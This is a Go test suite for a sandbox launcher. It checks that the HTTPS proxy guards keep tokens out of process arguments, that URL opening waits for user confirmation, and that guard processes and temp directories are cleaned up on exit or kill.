func TestAGuardThatExitsStopsTheStart(t *testing.T) {
	h := newHarness(t)
	h.cfg.Guards.SecretService = true
	h.cfg.DBusDaemon, _ = exec.LookPath("false")
	h.run("", map[string]string{"DBUS_SESSION_BUS_ADDRESS": "unix:path=/nonexistent"}).refused(t, "dbus-daemon exited with status 1")
	// Its temp dir is removed all the same.
	if entries, _ := os.ReadDir(h.tmpdir); len(entries) != 0 {
		t.Errorf("left %v", entries)
	}
}

// The proxy URL carries the secret the guard checks, its port is mapped
// in, and its CA is in the bundle gh/fj inside trust.
func TestHTTPSProxyGuards(t *testing.T) {
	for name, variable := range map[string]string{"github": "SANDBOX_GH_PROXY", "forgejo": "SANDBOX_FJ_PROXY"} {
		t.Run(name, func(t *testing.T) {
			h := newHarness(t)
			if name == "forgejo" {
				h.cfg.Default.ForgejoTokenCommands = map[string]string{"forgejo.example": "echo forgejo-token"}
			} else {
				h.cfg.Default.GitHubTokenCommand = "echo github_pat_" + strings.Repeat("t", 30)
			}
			h.cfg.HostPorts = []string{"5037"}
			r := h.run("", map[string]string{"VAR": variable}, h.tool("proxy-check"))
			fields := strings.Fields(r.stdout)
			if r.code != 0 || len(fields) != 3 {
				t.Fatalf("%d %q %q", r.code, r.stdout, r.stderr)
			}
			inv := r.pasta(t)
			if inv.tcpPorts() != "5037" || !strings.Contains(inv.pastaOpt("-T"), fields[0]) || fields[1] == "407" || fields[2] != "407" {
				t.Errorf("%q %q", inv.pastaOpt("-T"), fields)
			}
			env := inv.setenv()
			if env["SANDBOX_CA_FILE"] != h.runtime+"/sandbox-ca.pem" || name == "github" && env["GH_TOKEN"] != "sandbox-placeholder" {
				t.Errorf("%v", env)
			}
			// The guard's secret is no argument of pasta or bwrap, which any
			// user of the host could read.
			secret := strings.TrimPrefix(strings.Split(env[variable], "@")[0], "http://sandbox:")
			for _, e := range r.log {
				if e.Tool == "pasta" && (len(secret) < 20 || strings.Contains(strings.Join(e.Raw, " "), secret)) {
					t.Errorf("secret %q in %q", secret, e.Raw)
				}
			}
			// The system bundle's path too, for nix.sh's NIX_SSL_CERT_FILE.
			if got, want := inv.bind(t, "/etc/ssl/certs/ca-bundle.crt"), inv.bind(t, h.runtime+"/sandbox-ca.pem"); got != want {
				t.Errorf("system bundle %q, want %q", got, want)
			}
		})
	}
	h := newHarness(t)
	inv := h.run("", nil).pasta(t)
	if _, ok := inv.setenv()["SANDBOX_CA_FILE"]; ok {
		t.Error("a CA bundle without intercepting guards")
	}
	if got := inv.bind(t, "/etc/ssl"); got != filepath.Join(h.tmp, "ssl") || slices.ContainsFunc(inv.mounts(), func(m string) bool { return strings.HasSuffix(m, " /etc/ssl/certs/ca-bundle.crt") }) {
		t.Errorf("system bundle replaced without intercepting guards: %q", inv.mounts())
	}
}

// openURL runs sandbox-bin xdg-open url inside, on a terminal, with a host
// xdg-open that logs what it's given.
func (h *harness) openURL(url string) (*ptyRun, string) {
	log := filepath.Join(h.tmp, "xdg.log")
	os.WriteFile(filepath.Join(h.hostBin, "xdg-open"), []byte("#!/bin/sh\necho \"$*\" >> "+log+"\npwd > "+log+".pwd\n"), 0o755)
	h.cfg.Guards.OpenURL = true
	return h.pty(nil, testbin.Path(h.t), "xdg-open", url), log
}

// The guard runs the host's xdg-open, from the store's tools first on
// PATH, after a yes in the popup the launcher draws on its terminal.
func TestOpenURL(t *testing.T) {
	h := newHarness(t)
	p, log := h.openURL("https://example.org/x")
	if shown := p.expect("y = once, A = always in this sandbox, N = no:"); !strings.Contains(shown, "https://example.org/x") {
		t.Errorf("%q", shown)
	}
	time.Sleep(600 * time.Millisecond) // Keys typed right after a popup appears are dropped.
	p.send("y\r")
	r := p.wait()
	if r.code != 0 {
		t.Fatalf("%d %q", r.code, r.stdout)
	}
	// Started in the background, so the sandbox doesn't wait for the
	// browser.
	var opened []byte
	for deadline := time.Now().Add(10 * time.Second); len(opened) == 0 && time.Now().Before(deadline); time.Sleep(50 * time.Millisecond) {
		opened, _ = os.ReadFile(log)
	}
	if string(opened) != "https://example.org/x\n" {
		t.Errorf("opened %q", opened)
	}
	// From /, not the project, where the sandbox could leave it a config.
	if dir, _ := os.ReadFile(log + ".pwd"); string(dir) != "/\n" {
		t.Errorf("xdg-open ran in %q", dir)
	}
	inv := r.pasta(t)
	if inv.setenv()["BROWSER"] != "/usr/bin/xdg-open" {
		t.Error("no BROWSER")
	}
	// The guard is stopped and its dir - in the runtime dir, where no
	// project can be - removed with the sandbox.
	left, _ := filepath.Glob(filepath.Join(h.runtime, "sandbox-*"))
	if entries, _ := os.ReadDir(h.tmpdir); len(entries) != 0 || len(left) != 0 {
		t.Errorf("left %v %v", entries, left)
	}

	h = newHarness(t)
	p, log = h.openURL("https://example.org/x")
	p.expect("N = no:")
	time.Sleep(600 * time.Millisecond)
	p.send("n\r")
	if r := p.wait(); r.code != 4 || !strings.Contains(r.stdout, "denied") || exists(log) {
		t.Errorf("%d %q", r.code, r.stdout)
	}

	// No one to ask: the guards answer no.
	h = newHarness(t)
	h.cfg.Guards.OpenURL = true
	if r := h.run("", nil, testbin.Path(t), "xdg-open", "https://example.org/"); r.code != 4 || !strings.Contains(r.stderr, "denied") {
		t.Errorf("%d %q", r.code, r.stderr)
	}
}

// The sandbox runs on a pty of the launcher's, sized like its own.
func TestTheTerminalIsRelayed(t *testing.T) {
	h := newHarness(t)
	p := h.pty(nil, h.tool("echo-size"))
	if shown := p.expect("say: "); !strings.Contains(shown, "size 80 24") {
		t.Errorf("%q", shown)
	}
	p.send("hello\r")
	p.expect("got hello")
	r := p.wait()
	if r.code != 0 || len(r.log) == 0 || !r.log[len(r.log)-1].TTY {
		t.Errorf("%d %+v", r.code, r.log)
	}
}

func TestSIGTERMStopsTheSandboxAndItsGuards(t *testing.T) {
	h := newHarness(t)
	h.cfg.Guards.OpenURL = true
	ready := filepath.Join(h.tmp, "ready")
	cmd := h.command("", map[string]string{"READY": ready}, h.tool("wait-ready"))
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	for deadline := time.Now().Add(20 * time.Second); !exists(ready); time.Sleep(50 * time.Millisecond) {
		if time.Now().After(deadline) {
			t.Fatal("never ready")
		}
	}
	guards := children(cmd.Process.Pid, "open-url-guard")
	if len(guards) != 1 {
		t.Fatalf("guards %v", guards)
	}
	cmd.Process.Signal(syscall.SIGTERM)
	done := make(chan error)
	go func() { done <- cmd.Wait() }()
	select {
	case err := <-done:
		if err == nil {
			t.Error("exit 0")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("still running")
	}
	if entries, _ := os.ReadDir(h.tmpdir); len(entries) != 0 {
		t.Errorf("left %v", entries)
	}
	if err := syscall.Kill(guards[0], 0); err == nil {
		t.Error("the guard outlived the sandbox")
	}
}

// running says whether pid is a process that hasn't exited: one that has
// may still be there, unreaped.
func running(pid int) bool {
	stat, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		return false
	}
	_, rest, _ := strings.Cut(string(stat), ") ")
	return !strings.HasPrefix(rest, "Z")
}

// Killed, the launcher stops nothing itself: its guards, which hold the
// tokens, and the sandbox go on their own, signaled when it dies.
func TestAKilledLauncherLeavesNothingRunning(t *testing.T) {
	h := newHarness(t)
	h.cfg.Guards.OpenURL = true
	ready := filepath.Join(h.tmp, "ready")
	cmd := h.command("", map[string]string{"READY": ready}, h.tool("wait-ready"))
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	for deadline := time.Now().Add(20 * time.Second); !exists(ready); time.Sleep(50 * time.Millisecond) {
		if time.Now().After(deadline) {
			t.Fatal("never ready")
		}
	}
	launcher := cmd.Process.Pid
	guards, pastas := children(launcher, "open-url-guard"), children(launcher, "pasta")
	if len(guards) != 1 || len(pastas) != 1 {
		t.Fatalf("guards %v, pasta %v", guards, pastas)
	}
	inside := children(pastas[0], "wait-ready")
	if len(inside) != 1 {
		t.Fatalf("inside %v", inside)
	}
	cmd.Process.Kill()
	cmd.Wait()
	left := map[string]int{"the guard": guards[0], "pasta": pastas[0], "the sandboxed command": inside[0]}
	for deadline := time.Now().Add(10 * time.Second); len(left) > 0 && time.Now().Before(deadline); time.Sleep(50 * time.Millisecond) {
		maps.DeleteFunc(left, func(_ string, pid int) bool { return !running(pid) })
	}
	for what := range left {
		t.Errorf("%s outlived the killed launcher", what)
	}
}
